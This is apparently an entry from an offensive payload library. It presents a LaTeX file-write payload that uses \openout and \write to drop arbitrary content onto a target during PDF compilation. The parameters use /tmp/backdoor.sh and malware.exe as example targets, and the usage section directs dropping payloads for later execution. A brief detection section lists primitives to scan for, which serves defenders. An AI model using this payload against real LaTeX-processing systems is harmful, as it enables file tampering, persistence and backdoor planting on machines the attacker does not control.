---
id: b7d5bab0-e989-48f1-af2c-f72f4bb672ea
type: code
language: LaTeX
verified: true
created_at: '2019-10-16T00:00:03.568906+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
  - Windows
tags:
  - RCE
  - file-write
  - known-vulnerability
validated: true
---

# LaTeX-File-Write-Payload

## Code

```latex
\newwrite\outfile
\openout\outfile=$FULL_PATH_TO_FILE
\write\outfile{$TEXT}
\closeout\outfile
```

## Description

This LaTeX code snippet allows writing arbitrary text to a specified file on the target system during PDF compilation, exploiting shell-escape permissions. It enables persistence or configuration tampering by creating or appending to files like log files or scripts.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $FULL_PATH_TO_FILE | Full path to the output file | `/tmp/backdoor.sh` or `C:\\temp\\malware.exe` |
| $TEXT | Content to write to the file | `echo 'Malicious content'` |

## Usage

Insert into a .tex file and process with a vulnerable LaTeX compiler. Verify success by checking if the file was created or modified on the target. Use for dropping payloads that can be executed later.

## Detection

- Input scanning for `\newwrite`, `\openout`, or `\write` primitives.
- File system monitoring for unexpected writes during document processing.
- Integrity checks on critical files post-compilation.

## Related

- [[procedures/LaTeX-PDF-Read-Write-and-Code-Execution]]
